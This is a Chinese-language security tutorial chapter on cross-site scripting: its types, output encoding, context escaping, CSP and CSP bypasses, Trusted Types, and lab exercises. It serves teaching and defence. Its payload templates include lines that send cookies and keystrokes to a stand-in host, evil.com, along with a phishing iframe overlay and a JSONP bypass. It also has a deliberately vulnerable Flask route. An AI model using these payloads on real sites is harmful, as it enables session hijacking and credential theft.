# Ch 9 — A05 XSS

> 目標：搞懂 XSS 三類型（Reflected / Stored / DOM）、CSP bypass、現代 framework 防禦機制。

> **2025 變動**：XSS 在 2021 / 2025 都歸在 Injection 大類，2025 編號是 A05。

## XSS 是什麼

「**Cross-Site Scripting**」 — 攻擊者讓 victim 的 browser 執行**攻擊者控制**的 JS。

威力：

- 偷 cookie / token → 帳號 takeover
- 改 DOM 顯示假內容 → phishing
- 偷 keystrokes → 偷密碼
- crypto miner / DDoS bot
- 對其他 user 的 web action（CSRF + XSS = full control）

## 3 大 XSS 類型

### 1. Reflected XSS

payload 在 URL，server 把它「**反射**」到 response 中：

```
URL: https://example.com/search?q=<script>alert(1)</script>

server 產 HTML:
<h1>Search results for: <script>alert(1)</script></h1>

browser 執行 → alert
```

attacker 寄連結給 victim → victim click → 在 victim browser 跑 attacker JS。

### 2. Stored XSS

payload 存 DB（如 user comment）→ 後續任何 user 看頁面都 trigger：

```
attacker 在 comment 欄位輸入: <script>document.location='http://evil.com/?c='+document.cookie</script>
↓
存進 DB
↓
別 user 開 comment 頁 → script 跑 → cookie 送 attacker
```

**最危險的 XSS 類型** — 不需要 victim 互動，passive 受害。

### 3. DOM-based XSS

純前端漏洞，server 不知情：

```html
<script>
const params = new URLSearchParams(location.search);
document.getElementById('greeting').innerHTML = params.get('name');
</script>
```

URL: `?name=<img src=x onerror=alert(1)>` → 前端 JS 把 payload 塞進 DOM → 觸發。

server 完全沒看 `name` 參數，但 victim browser 仍執行 attacker JS。

## XSS payload 範本

```html
<!-- 經典 -->
<script>alert(1)</script>

<!-- script tag 被 filter -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 偷 cookie -->
<script>fetch('http://evil.com/?c='+document.cookie)</script>

<!-- DOM 修改 -->
<script>document.body.innerHTML='<h1>Site Hacked</h1>'</script>

<!-- iframe phishing -->
<iframe src="http://evil.com/fake-login.html" style="position:fixed;top:0;left:0;width:100%;height:100%;border:0;"></iframe>

<!-- keylogger -->
<script>document.onkeypress=e=>fetch('http://evil.com/?k='+e.key)</script>

<!-- 自我傳播（XSS worm） -->
<script>
fetch('/post', {method:'POST', body: location.href})
</script>
```

## 防禦：Output Encoding

「**把 user input 顯示在 HTML 時，escape 為 HTML entity**」：

```
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
& → &amp;
```

例：

```html
<!-- 攻擊 input: <script>alert(1)</script> -->

<!-- 沒 escape -->
<div>Hello, <script>alert(1)</script>!</div>   ← 執行

<!-- escape 後 -->
<div>Hello, &lt;script&gt;alert(1)&lt;/script&gt;!</div>   ← 純文字
```

### Framework 預設 escape

modern framework 預設 escape：

```jsx
// React
<div>Hello, {name}</div>   // 自動 escape

// Vue
<div>Hello, {{ name }}</div>   // 自動 escape

// Angular
<div>Hello, {{ name }}</div>   // 自動 escape

// Django template
<div>Hello, {{ name }}</div>   // 自動 escape (除非 |safe)
```

「**用 framework default 90% XSS 防住**」。

### 但有「**逃出**」的 case

```jsx
// React
<div dangerouslySetInnerHTML={{__html: userInput}}></div>   // 危險！

// Vue
<div v-html="userInput"></div>   // 危險！

// Angular
<div [innerHTML]="userInput"></div>   // 危險（除非 trust）
```

這些 API 名字都帶警告（dangerously / v-html / innerHTML）— **明確繞過 escape**。

## 不同 context 的 escape

HTML escape 不夠，要看**塞在哪個 context**：

### HTML body

```html
<div>USER_INPUT</div>
```

→ HTML escape (`<`, `>`, `&`, `"`, `'`).

### HTML attribute

```html
<input value="USER_INPUT">
```

→ HTML attribute encoding (含 `\n`, `\r`, `=`).

### JavaScript

```html
<script>
let name = "USER_INPUT";
</script>
```

→ JS string escape (`\"`, `\\`, control chars).

### URL

```html
<a href="USER_INPUT">click</a>
```

→ URL encoding。**但 `javascript:URL` 是 XSS！**

```html
<a href="javascript:alert(1)">click</a>   ← XSS
```

→ 額外 check URL 開頭是否 `javascript:` / `data:` / `vbscript:`.

### CSS

```html
<style>
body { background: url(USER_INPUT); }
</style>
```

→ CSS escape，且禁 `expression()` (老 IE)。

## CSP（防 XSS 第二道防線）

回 Ch 3。CSP 限制 script source：

```
Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
```

attacker 注入 inline script 沒 nonce → browser block：

```html
<!-- attacker payload -->
<script>alert(1)</script>   ← block (no nonce)

<!-- legit -->
<script nonce="RANDOM_NONCE">good_code()</script>   ← OK
```

### CSP bypass

CSP 寫不嚴 → bypass：

#### `unsafe-inline`

```
script-src 'self' 'unsafe-inline'
```

→ 所有 inline 都 OK → CSP 沒用。

#### 上傳 JSONP endpoint

```
script-src 'self' https://api.google.com
```

但 google.com 有 JSONP endpoint：

```html
<script src="https://api.google.com/jsonp?callback=alert(1)//"></script>
```

→ google.com 回 `alert(1)//(...)` → 執行。

#### CDN with user-uploaded content

```
script-src https://cdn.com
```

如果 cdn.com 接受 user upload → 攻擊者 upload JS file → load 過 CSP。

CSP 設計很細，**多數 production CSP 有 bypass**。

## DOM XSS 防禦：Trusted Types

新 browser 提供 `Trusted Types` API：

```javascript
// Strict CSP
Content-Security-Policy: require-trusted-types-for 'script'

// JS code
const policy = trustedTypes.createPolicy('myPolicy', {
  createHTML: input => DOMPurify.sanitize(input)
});

document.body.innerHTML = policy.createHTML(userInput);
// 必須通過 policy，否則 browser block
```

讓「**亂塞 string 到 innerHTML**」這類 sink 強制 sanitize。

## 真實案例：Twitter（2010）

Twitter 對 tweet 內容沒充分 escape：

- attacker tweet 含 `<script>` payload
- victim 看 tweet → script 自動 retweet payload + steal cookie
- **wormable XSS**：每個感染的 user 自動傳播給 follower
- 1 小時內感染數萬人

教訓：

- stored XSS 在 social network 是**指數傳播**
- 即使 1 個 escape miss 都災難

## 動手練習

**1. DVWA XSS challenges**

low / medium / high 三難度的 reflected / stored / DOM。

**2. Juice Shop XSS**

- "DOM XSS"（在 search 試）
- "Reflected XSS"
- "Persisted XSS"

**3. 寫 vulnerable Flask app**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

# 不安全：手動拼字串
@app.route('/greet')
def greet():
    name = request.args.get('name', 'guest')
    return f'<h1>Hello, {name}!</h1>'

# 較安全：用 template engine（Jinja2 預設 escape）
@app.route('/greet2')
def greet2():
    name = request.args.get('name', 'guest')
    return render_template_string('<h1>Hello, {{ name }}!</h1>', name=name)
```

訪問：

```
http://localhost:5000/greet?name=<script>alert(1)</script>     ← XSS
http://localhost:5000/greet2?name=<script>alert(1)</script>    ← 安全
```

**4. 試 CSP**

vulnerable.html 加 CSP meta tag：

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

打開 browser，console 試 `eval("alert(1)")` → CSP 阻擋。

**5. 用 Burp scanner / nuclei XSS template**

```bash
nuclei -t /path/to/templates/vulnerabilities/generic/ -u http://target
```

掃 reflected XSS。
